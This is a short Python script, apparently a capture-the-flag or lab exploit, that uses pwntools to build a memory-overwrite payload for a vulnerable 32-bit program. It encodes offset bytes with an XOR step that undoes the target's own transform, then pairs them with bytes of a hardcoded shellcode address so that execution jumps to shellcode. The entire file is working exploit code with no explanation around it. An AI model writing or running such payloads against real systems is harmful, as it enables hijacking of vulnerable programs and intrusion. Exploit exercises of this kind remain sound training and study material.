import sys
from pwn import *

def get_byte(num, pos):
    return (num >> (pos * 8)) & 0xff

shellcode_address = 0xffffd549
size_to_override = 36

payload = b''

for i in range(4):
    # buffer[counter] = buffer[counter] ^ counter * '\x03';
    ch = size_to_override + i
    ch ^= i * 3
    payload += p8(ch)

    payload += p8(get_byte(shellcode_address, i))


sys.stdout.buffer.write(payload)
